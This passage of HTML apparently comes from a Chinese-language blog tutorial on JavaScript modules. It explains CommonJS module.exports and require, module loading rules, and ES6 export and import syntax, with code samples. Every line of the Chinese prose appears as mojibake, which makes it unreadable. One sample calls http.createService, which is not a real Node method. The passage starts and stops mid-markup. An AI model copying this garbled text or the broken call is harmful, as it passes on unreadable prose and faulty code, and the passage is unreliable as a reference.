title="å¯¼å‡ºæ¨¡å—"></a>å¯¼å‡ºæ¨¡å—</h3><p>CommonJSè§„èŒƒè§„å®šï¼Œæ¯ä¸ªæ¨¡å—å†…éƒ¨ï¼Œ<strong>module</strong>å˜é‡ä»£è¡¨å½“å‰æ¨¡å—ã€‚è¿™ä¸ªå˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒçš„<strong>exports</strong>å±æ€§ï¼ˆå³<strong>module.exports</strong>ï¼‰æ˜¯å¯¹å¤–çš„æ¥å£ã€‚åŠ è½½æŸä¸ªæ¨¡å—ï¼Œå…¶å®æ˜¯åŠ è½½è¯¥æ¨¡å—çš„<strong>module.exports</strong>å±æ€§ã€‚</p><p>ä¸ºäº†æ–¹ä¾¿ï¼ŒNodeä¸ºæ¯ä¸ªæ¨¡å—æä¾›ä¸€ä¸ªexportså˜é‡ï¼ŒæŒ‡å‘module.exportsã€‚è¿™ç­‰åŒåœ¨æ¯ä¸ªæ¨¡å—å¤´éƒ¨ï¼Œæœ‰ä¸€è¡Œè¿™æ ·çš„å‘½ä»¤ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var exports = module.exports;</span><br></pre></td></tr></table></figure><p>åœ¨å¯¹å¤–è¾“å‡ºæ¨¡å—æ¥å£æ—¶ï¼Œå¯ä»¥å‘<strong>exports</strong>å¯¹è±¡æ·»åŠ æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exports.area = function (r) &#123;</span><br><span class="line">  return Math.PI * r * r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">exports.circumference = function (r) &#123;</span><br><span class="line">  return 2 * Math.PI * r;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼Œä¸èƒ½ç›´æ¥å°†exportså˜é‡æŒ‡å‘ä¸€ä¸ªå€¼ï¼Œå› ä¸ºè¿™æ ·ç­‰äºåˆ‡æ–­äº†exportsä¸module.exportsçš„è”ç³»ã€‚</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exports = function(x) &#123;console.log(x)&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€ï¼Œå¦‚æœä¸€ä¸ªæ¨¡å—çš„å¯¹å¤–æ¥å£ï¼Œå°±æ˜¯ä¸€ä¸ªå•ä¸€çš„å€¼ï¼Œä¸èƒ½ä½¿ç”¨exportsè¾“å‡ºï¼Œåªèƒ½ä½¿ç”¨module.exportsè¾“å‡ºã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exports.hello = function() &#123;</span><br><span class="line">  return &apos;hello&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module.exports = &apos;Hello world&apos;;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ä»£ç ä¸­ï¼Œhelloå‡½æ•°æ˜¯æ— æ³•å¯¹å¤–è¾“å‡ºçš„ï¼Œå› ä¸ºmodule.exportsè¢«é‡æ–°èµ‹å€¼äº†</p><h3 id="å¼•å…¥æ¨¡å—"><a href="#å¼•å…¥æ¨¡å—" class="headerlink" title="å¼•å…¥æ¨¡å—"></a>å¼•å…¥æ¨¡å—</h3><p>Nodeä½¿ç”¨CommonJSæ¨¡å—è§„èŒƒï¼Œå†…ç½®çš„<strong>require</strong>å‘½ä»¤ç”¨äºåŠ è½½æ¨¡å—æ–‡ä»¶ã€‚</p><p>requireå‘½ä»¤çš„åŸºæœ¬åŠŸèƒ½æ˜¯ï¼Œ<strong>è¯»å…¥å¹¶æ‰§è¡Œä¸€ä¸ªJavaScriptæ–‡ä»¶</strong>ï¼Œç„¶åè¿”å›<strong>è¯¥æ¨¡å—çš„exportså¯¹è±¡</strong>ã€‚å¦‚æœæ²¡æœ‰å‘ç°æŒ‡å®šæ¨¡å—ï¼Œä¼šæŠ¥é”™ã€‚</p><blockquote><p>ç‰¹æ€§</p></blockquote><p>commonJSç”¨åŒæ­¥çš„æ–¹å¼åŠ è½½æ¨¡å—ã€‚åœ¨æœåŠ¡ç«¯ï¼Œæ¨¡å—æ–‡ä»¶éƒ½å­˜åœ¨æœ¬åœ°ç£ç›˜ï¼Œè¯»å–éå¸¸å¿«ï¼Œæ‰€ä»¥è¿™æ ·åšä¸ä¼šæœ‰é—®é¢˜ã€‚ä½†æ˜¯åœ¨æµè§ˆå™¨ç«¯ï¼Œé™äºç½‘ç»œåŸå› ï¼Œæ›´åˆç†çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨å¼‚æ­¥åŠ è½½ã€‚</p><blockquote><p>å¯¼å…¥æ¨¡å—</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// math.js</span><br><span class="line">var basicNum = 0;</span><br><span class="line">function add(a, b) &#123;</span><br><span class="line">  return a + b;</span><br><span class="line">&#125;</span><br><span class="line">module.exports = &#123; //åœ¨è¿™é‡Œå†™ä¸Šéœ€è¦å‘å¤–æš´éœ²çš„å‡½æ•°ã€å˜é‡</span><br><span class="line">  add: add,</span><br><span class="line">  basicNum: basicNum</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// index.js</span><br><span class="line">var math = require(&apos;./math&apos;);</span><br><span class="line">//&#123;</span><br><span class="line">//    add: [Function],</span><br><span class="line">//    basicNum: 0</span><br><span class="line">//&#125;</span><br></pre></td></tr></table></figure><blockquote><p>åŠ è½½è§„åˆ™</p></blockquote><ol><li><p>å¦‚æœå‚æ•°å­—ç¬¦ä¸²ä»¥â€œ/â€å¼€å¤´ï¼Œåˆ™è¡¨ç¤ºåŠ è½½çš„æ˜¯ä¸€ä¸ªä½äºç»å¯¹è·¯å¾„çš„æ¨¡å—æ–‡ä»¶ã€‚æ¯”å¦‚ï¼Œrequire(â€˜/home/marco/foo.jsâ€™)å°†åŠ è½½/home/marco/foo.jsã€‚</p></li><li><p>å¦‚æœå‚æ•°å­—ç¬¦ä¸²ä»¥â€œ./â€å¼€å¤´ï¼Œåˆ™è¡¨ç¤ºåŠ è½½çš„æ˜¯ä¸€ä¸ªä½äºç›¸å¯¹è·¯å¾„ï¼ˆè·Ÿå½“å‰æ‰§è¡Œè„šæœ¬çš„ä½ç½®ç›¸æ¯”ï¼‰çš„æ¨¡å—æ–‡ä»¶ã€‚æ¯”å¦‚ï¼Œrequire(â€˜./circleâ€™)å°†åŠ è½½å½“å‰è„šæœ¬åŒä¸€ç›®å½•çš„circle.jsã€‚</p></li><li><p>å¦‚æœå‚æ•°å­—ç¬¦ä¸²ä¸ä»¥â€œ./â€œæˆ–â€/â€œå¼€å¤´ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªè·¯å¾„ï¼Œæ¯”å¦‚require(â€˜example-module/path/to/fileâ€™)ï¼Œåˆ™å°†å…ˆæ‰¾åˆ°example-moduleçš„ä½ç½®ï¼Œç„¶åå†ä»¥å®ƒä¸ºå‚æ•°ï¼Œæ‰¾åˆ°åç»­è·¯å¾„ã€‚</p></li><li><p>å¦‚æœæŒ‡å®šçš„æ¨¡å—æ–‡ä»¶æ²¡æœ‰å‘ç°ï¼ŒNodeä¼šå°è¯•ä¸ºæ–‡ä»¶åæ·»åŠ .jsã€.jsonã€.nodeåï¼Œå†å»æœç´¢ã€‚.jsä»¶ä¼šä»¥æ–‡æœ¬æ ¼å¼çš„JavaScriptè„šæœ¬æ–‡ä»¶è§£æï¼Œ.jsonæ–‡ä»¶ä¼šä»¥JSONæ ¼å¼çš„æ–‡æœ¬æ–‡ä»¶è§£æï¼Œ.nodeæ–‡ä»¶ä¼šä»¥ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶è§£æã€‚</p></li><li><p>å¦‚æœæƒ³å¾—åˆ°requireå‘½ä»¤åŠ è½½çš„ç¡®åˆ‡æ–‡ä»¶åï¼Œä½¿ç”¨require.resolve()æ–¹æ³•ã€‚</p></li><li><p>å¦‚æœå‚æ•°å­—ç¬¦ä¸²ä¸ä»¥â€œ./â€œæˆ–â€/â€œå¼€å¤´ï¼Œåˆ™è¡¨ç¤ºåŠ è½½çš„æ˜¯ä¸€ä¸ªé»˜è®¤æä¾›çš„æ ¸å¿ƒæ¨¡å—ï¼ˆä½äºNodeçš„ç³»ç»Ÿå®‰è£…ç›®å½•ä¸­ï¼‰ï¼Œæˆ–è€…ä¸€ä¸ªä½äºå„çº§node_modulesç›®å½•çš„å·²å®‰è£…æ¨¡å—ï¼ˆå…¨å±€å®‰è£…æˆ–å±€éƒ¨å®‰è£…ï¼‰ã€‚</p></li></ol><p>ä¸¾ä¾‹æ¥è¯´ï¼Œè„šæœ¬/home/user/projects/foo.jsæ‰§è¡Œäº†require(â€˜bar.jsâ€™)å‘½ä»¤ï¼ŒNodeä¼šä¾æ¬¡æœç´¢ä»¥ä¸‹æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/node/bar.js</span><br><span class="line">/home/user/projects/node_modules/bar.js</span><br><span class="line">/home/user/node_modules/bar.js</span><br><span class="line">/home/node_modules/bar.js</span><br><span class="line">/node_modules/bar.js</span><br></pre></td></tr></table></figure><blockquote><p>å¼•å…¥</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// å¼•ç”¨è‡ªå®šä¹‰çš„æ¨¡å—æ—¶ï¼Œå‚æ•°åŒ…å«è·¯å¾„ï¼Œå¯çœç•¥.js</span><br><span class="line">var math = require(&apos;./math&apos;);</span><br><span class="line">math.add(2, 5);</span><br><span class="line"></span><br><span class="line">// å¼•ç”¨æ ¸å¿ƒæ¨¡å—æ—¶ï¼Œä¸éœ€è¦å¸¦è·¯å¾„</span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line">http.createService(...).listen(3000);</span><br></pre></td></tr></table></figure><blockquote><p>ç›®å½•çš„åŠ è½½è§„åˆ™</p></blockquote><p>åœ¨ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªpackage.jsonæ–‡ä»¶ï¼Œå¹¶ä¸”å°†å…¥å£æ–‡ä»¶å†™å…¥mainå­—æ®µã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// package.json</span><br><span class="line">&#123; &quot;name&quot; : &quot;some-library&quot;,</span><br><span class="line">  &quot;main&quot; : &quot;./lib/some-library.js&quot; &#125;</span><br></pre></td></tr></table></figure><h3 id="moduleå¯¹è±¡"><a href="#moduleå¯¹è±¡" class="headerlink" title="moduleå¯¹è±¡"></a>moduleå¯¹è±¡</h3><p>Nodeå†…éƒ¨æä¾›ä¸€ä¸ªModuleæ„å»ºå‡½æ•°ã€‚æ‰€æœ‰æ¨¡å—éƒ½æ˜¯Moduleçš„å®ä¾‹ã€‚</p><ul><li>module.id æ¨¡å—çš„è¯†åˆ«ç¬¦ï¼Œé€šå¸¸æ˜¯å¸¦æœ‰ç»å¯¹è·¯å¾„çš„æ¨¡å—æ–‡ä»¶åã€‚</li><li>module.filename æ¨¡å—çš„æ–‡ä»¶åï¼Œå¸¦æœ‰ç»å¯¹è·¯å¾„ã€‚</li><li>module.loaded è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ¨¡å—æ˜¯å¦å·²ç»å®ŒæˆåŠ è½½ã€‚</li><li>module.parent è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¡¨ç¤ºè°ƒç”¨è¯¥æ¨¡å—çš„æ¨¡å—ã€‚</li><li>module.children è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè¡¨ç¤ºè¯¥æ¨¡å—è¦ç”¨åˆ°çš„å…¶ä»–æ¨¡å—ã€‚</li><li>module.exports è¡¨ç¤ºæ¨¡å—å¯¹å¤–è¾“å‡ºçš„å€¼ã€‚</li></ul><h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><p>æ¨¡å—åŠŸèƒ½ä¸»è¦ç”±ä¸¤ä¸ªå‘½ä»¤æ„æˆï¼š<strong>export</strong>å’Œ<strong>import</strong>ã€‚<strong>export</strong>å‘½ä»¤ç”¨äºè§„å®šæ¨¡å—çš„å¯¹å¤–æ¥å£ï¼Œ<strong>import</strong>å‘½ä»¤ç”¨äºè¾“å…¥å…¶ä»–æ¨¡å—æä¾›çš„åŠŸèƒ½ã€‚</p><p>ä¸€ä¸ªæ¨¡å—å°±æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å†…éƒ¨çš„æ‰€æœ‰å˜é‡ï¼Œå¤–éƒ¨æ— æ³•è·å–ã€‚å¦‚æœä½ å¸Œæœ›å¤–éƒ¨èƒ½å¤Ÿè¯»å–æ¨¡å—å†…éƒ¨çš„æŸä¸ªå˜é‡ï¼Œå°±å¿…é¡»ä½¿ç”¨exportå…³é”®å­—è¾“å‡ºè¯¥å˜é‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;module&quot;&gt;</span><br><span class="line">  import utils from &quot;./utils.js&quot;;</span><br><span class="line"></span><br><span class="line">  // other code</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="ES6-æ¨¡å—ä¸-CommonJS-æ¨¡å—çš„å·®å¼‚"><a href="#ES6-æ¨¡å—ä¸-CommonJS-æ¨¡å—çš„å·®å¼‚" class="headerlink" title="ES6 æ¨¡å—ä¸ CommonJS æ¨¡å—çš„å·®å¼‚"></a>ES6 æ¨¡å—ä¸ CommonJS æ¨¡å—çš„å·®å¼‚</h3><blockquote><p>å®ƒä»¬æœ‰ä¸¤ä¸ªé‡å¤§å·®å¼‚</p></blockquote><ul><li>CommonJS æ¨¡å—è¾“å‡ºçš„æ˜¯ä¸€ä¸ªå€¼çš„æ‹·è´ï¼ŒES6 æ¨¡å—è¾“å‡ºçš„æ˜¯å€¼çš„å¼•ç”¨ã€‚</li><li>CommonJS æ¨¡å—æ˜¯è¿è¡Œæ—¶åŠ è½½ï¼ŒES6 æ¨¡å—æ˜¯ç¼–è¯‘æ—¶è¾“å‡ºæ¥å£ã€‚</li></ul><h4 id="ES6-æ¨¡å—åŠ è½½-CommonJS-æ¨¡å—"><a href="#ES6-æ¨¡å—åŠ è½½-CommonJS-æ¨¡å—" class="headerlink" title="ES6 æ¨¡å—åŠ è½½ CommonJS æ¨¡å—"></a>ES6 æ¨¡å—åŠ è½½ CommonJS æ¨¡å—</h4><p>CommonJS æ¨¡å—çš„è¾“å‡ºéƒ½å®šä¹‰åœ¨module.exportsè¿™ä¸ªå±æ€§ä¸Šé¢ã€‚Node çš„importå‘½ä»¤åŠ è½½ CommonJS æ¨¡å—ï¼ŒNode ä¼šè‡ªåŠ¨å°†module.exportså±æ€§ï¼Œå½“ä½œæ¨¡å—çš„é»˜è®¤è¾“å‡ºï¼Œå³ç­‰åŒäºexport default xxxã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// a.js</span><br><span class="line">module.exports = &#123;</span><br><span class="line">  foo: &apos;hello&apos;,</span><br><span class="line">  bar: &apos;world&apos;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// ç­‰åŒäº</span><br><span class="line">export default &#123;</span><br><span class="line">  foo: &apos;hello&apos;,</span><br><span class="line">  bar: &apos;world&apos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸€å…±æœ‰ä¸‰ç§å†™æ³•ï¼Œå¯ä»¥æ‹¿åˆ° CommonJS æ¨¡å—çš„module.exportsã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// å†™æ³•ä¸€</span><br><span class="line">import baz from &apos;./a&apos;;</span><br><span class="line">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class="line"></span><br><span class="line">// å†™æ³•äºŒ</span><br><span class="line">import &#123;default as baz&#125; from &apos;./a&apos;;</span><br><span class="line">// baz = &#123;foo: &apos;hello&apos;, bar: &apos;world&apos;&#125;;</span><br><span class="line"></span><br><span class="line">// å†™æ³•ä¸‰</span><br><span class="line">import * as baz from &apos;./a&apos;;</span><br></pre></td></tr></table></figure><h4 id="CommonJS-æ¨¡å—åŠ è½½-ES6-æ¨¡å—"><a href="#CommonJS-æ¨¡å—åŠ è½½-ES6-æ¨¡å—" class="headerlink" title="CommonJS æ¨¡å—åŠ è½½ ES6 æ¨¡å—"></a>CommonJS æ¨¡å—åŠ è½½ ES6 æ¨¡å—</h4><p>CommonJS æ¨¡å—åŠ è½½ ES6 æ¨¡å—ï¼Œä¸èƒ½ä½¿ç”¨requireå‘½ä»¤ï¼Œè€Œè¦ä½¿ç”¨import()å‡½æ•°ã€‚ES6 æ¨¡å—çš„æ‰€æœ‰è¾“å‡ºæ¥å£ï¼Œä¼šæˆä¸ºè¾“å…¥å¯¹è±¡çš„å±æ€§ã€‚</p><h3 id="å¯¼å‡ºæ¨¡å—-1"><a href="#å¯¼å‡ºæ¨¡å—-1" class="headerlink" title="å¯¼å‡ºæ¨¡å—"></a>å¯¼å‡ºæ¨¡å—</h3><h4 id="å¯¼å‡ºæ–¹å¼"><a href="#å¯¼å‡ºæ–¹å¼" class="headerlink" title="å¯¼å‡ºæ–¹å¼"></a>å¯¼å‡ºæ–¹å¼</h4><p>1ã€å¤šæ¬¡ä½¿ç”¨export</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// profile.js</span><br><span class="line">export var firstName = &apos;Michael&apos;;</span><br><span class="line">export var lastName = &apos;Jackson&apos;;</span><br><span class="line">export var year = 1958;</span><br></pre></td></tr></table></figure><p>exportå‘½ä»¤å¯¹å¤–éƒ¨è¾“å‡ºäº†ä¸‰ä¸ªå˜é‡ã€‚</p><p>2ã€å¯¼å‡ºå¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// profile.js</span><br><span class="line">var firstName = &apos;Michael&apos;;</span><br><span class="line">var lastName = &apos;Jackson&apos;;</span><br><span class="line">var year = 1958;</span><br><span class="line"></span><br><span class="line">export &#123;firstName, lastName, year&#125;;</span><br></pre></td></tr></table></figure><p>3ã€ç›´æ¥å¯¼å‡ºå•ä¸ªå˜é‡ã€å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export function multiply(x, y) &#123;</span><br><span class="line">  return x * y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>4ã€å¯¼å‡ºé»˜è®¤æ¨¡å—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// æ­£ç¡®</span><br><span class="line">export var a = 1;</span><br><span class="line"></span><br><span class="line">// æ­£ç¡®</span><br><span class="line">var a = 1;</span><br><span class="line">export default a;</span><br><span class="line"></span><br><span class="line">// é”™è¯¯</span><br><span class="line">export default var a = 1;</span><br></pre></td></tr></table></figure><h4 id="å¯¼å‡ºæ³¨æ„ç‚¹"><a href="#å¯¼å‡ºæ³¨æ„ç‚¹" class="headerlink" title="å¯¼å‡ºæ³¨æ„ç‚¹"></a>å¯¼å‡ºæ³¨æ„ç‚¹</h4><p><strong>exportå‘½ä»¤è§„å®šçš„æ˜¯å¯¹å¤–çš„æ¥å£ï¼Œå¿…é¡»ä¸æ¨¡å—å†…éƒ¨çš„å˜é‡å»ºç«‹ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚</strong>(ç®€è€Œè¨€ä¹‹å¯¼å‡ºçš„å¿…é¡»æ˜¯å¯¹è±¡çš„key)</p><blockquote><p>å¿…é¡»å»ºè®®æ„ä¹‰å¯¹åº”å…³ç³»</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export var year = 1958;</span><br><span class="line">//==</span><br><span class="line">export &#123;</span><br><span class="line">    year</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// æŠ¥é”™</span><br><span class="line">export 1;</span><br><span class="line">// æŠ¥é”™</span><br><span class="line">var m = 1;</span><br><span class="line">export m;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸Šé¢ä¸¤ç§å†™æ³•éƒ½ä¼šæŠ¥é”™ï¼Œå› ä¸ºæ²¡æœ‰æä¾›å¯¹å¤–çš„æ¥å£ã€‚æ­£ç¡®å†™æ³•ï¼š</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// å†™æ³•ä¸€</span><br><span class="line">export var m = 1;</span><br><span class="line"></span><br><span class="line">// å†™æ³•äºŒ</span><br><span class="line">var m = 1;</span><br><span class="line">export &#123;m&#125;;</span><br><span class="line"></span><br><span class="line">// å†™æ³•ä¸‰</span><br><span class="line">var n = 1;</span><br><span class="line">export &#123;n as m&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>åŒæ ·çš„ï¼Œfunctionå’Œclassçš„è¾“å‡ºï¼Œä¹Ÿå¿…é¡»éµå®ˆè¿™æ ·çš„å†™æ³•ã€‚</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// æŠ¥é”™</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">export f;</span><br><span class="line"></span><br><span class="line">// æ­£ç¡®</span><br><span class="line">export function f() &#123;&#125;;</span><br><span class="line"></span><br><span class="line">// æ­£ç¡®</span><br><span class="line">function f() &#123;&#125;</span><br><span class="line">export &#123;f&#125;;</span><br></pre></td></tr></table></figure><p><strong>å¦å¤–ï¼Œexportè¯­å¥è¾“å‡ºçš„æ¥å£ï¼Œä¸å…¶å¯¹åº”çš„å€¼æ˜¯åŠ¨æ€ç»‘å®šå…³ç³»ï¼Œå³é€šè¿‡è¯¥æ¥å£ï¼Œå¯ä»¥å–åˆ°æ¨¡å—å†…éƒ¨å®æ—¶çš„å€¼ã€‚</strong></p><h4 id="æ¨¡å—åˆ«å"><a href="#æ¨¡å—åˆ«å" class="headerlink" title="æ¨¡å—åˆ«å"></a>æ¨¡å—åˆ«å</h4><p>æµè§ˆå™¨åŠ è½½ <strong>ES6</strong> æ¨¡å—ï¼Œä¹Ÿä½¿ç”¨<strong><code>&lt;script&gt;</code></strong>æ ‡ç­¾ï¼Œä½†æ˜¯è¦åŠ å…¥<strong>type=â€moduleâ€</strong>å±æ€§</p><p>æµè§ˆå™¨å¯¹äºå¸¦æœ‰<strong>type=â€moduleâ€</strong>çš„<strong><code>&lt;script&gt;</code></strong>ï¼Œç­‰åŒäºæ‰“å¼€äº†<strong><code>&lt;script&gt;</code>æ ‡ç­¾çš„defer</strong>å±æ€§ã€‚</p><blockquote><p>ES6 æ¨¡å—ä¹Ÿå…è®¸å†…åµŒåœ¨ç½‘é¡µä¸­</p></blockquote><ul><li>ä»£ç æ˜¯åœ¨æ¨¡å—ä½œç”¨åŸŸä¹‹ä¸­è¿è¡Œï¼Œè€Œä¸æ˜¯åœ¨å…¨å±€ä½œç”¨åŸŸè¿è¡Œã€‚æ¨¡å—å†…éƒ¨çš„é¡¶å±‚å˜é‡ï¼Œå¤–éƒ¨ä¸å¯è§ã€‚</li><li>æ¨¡å—è„šæœ¬è‡ªåŠ¨é‡‡ç”¨ä¸¥æ ¼æ¨¡å¼ï¼Œä¸ç®¡æœ‰æ²¡æœ‰å£°æ˜use strictã€‚</li><li>æ¨¡å—ä¹‹ä¸­ï¼Œå¯ä»¥ä½¿ç”¨importå‘½ä»¤åŠ è½½å…¶ä»–æ¨¡å—ï¼ˆ.jsåç¼€ä¸å¯çœç•¥ï¼Œéœ€è¦æä¾›ç»å¯¹ URL æˆ–ç›¸å¯¹ URLï¼‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨exportå‘½ä»¤è¾“å‡ºå¯¹å¤–æ¥å£ã€‚</li><li>æ¨¡å—ä¹‹ä¸­ï¼Œé¡¶å±‚çš„thiså…³é”®å­—è¿”å›undefinedï¼Œè€Œä¸æ˜¯æŒ‡å‘windowã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ¨¡å—é¡¶å±‚ä½¿ç”¨thiså…³é”®å­—ï¼Œæ˜¯æ— æ„ä¹‰çš„ã€‚</li><li>åŒä¸€ä¸ªæ¨¡å—å¦‚æœåŠ è½½å¤šæ¬¡ï¼Œå°†åªæ‰§è¡Œä¸€æ¬¡ã€‚</li></ul><blockquote><p>ç¤ºä¾‹æ¨¡å—</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import utils from &apos;https://example.com/js/utils.js&apos;;</span><br><span class="line"></span><br><span class="line">const x = 1;</span><br><span class="line"></span><br><span class="line">console.log(x === window.x); //false</span><br><span class="line">console.log(this === undefined); // true</span><br></pre></td></tr></table></figure><h3 id="å¯¼å…¥æ¨¡å—"><a href="#å¯¼å…¥æ¨¡å—" class="headerlink" title="å¯¼å…¥æ¨¡å—"></a>å¯¼å…¥æ¨¡å—</h3><p>ä½¿ç”¨exportå‘½ä»¤å®šä¹‰äº†æ¨¡å—çš„å¯¹å¤–æ¥å£ä»¥åï¼Œå…¶ä»– JS æ–‡ä»¶å°±å¯ä»¥é€šè¿‡importå‘½ä»¤åŠ è½½è¿™ä¸ªæ¨¡å—ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// main.js</span><br><span class="line">import &#123;firstName, lastName, year&#125; from &apos;./profile.js&apos;;</span><br><span class="line"></span><br><span class="line">function setName(element) &#123;</span><br><span class="line">  element.textContent = firstName + &apos; &apos; + lastName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼Œimportå‘½ä»¤å…·æœ‰æå‡æ•ˆæœï¼Œä¼šæå‡åˆ°æ•´ä¸ªæ¨¡å—çš„å¤´éƒ¨ï¼Œé¦–å…ˆæ‰§è¡Œã€‚</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">foo();</span><br><span class="line">import &#123; foo &#125; from 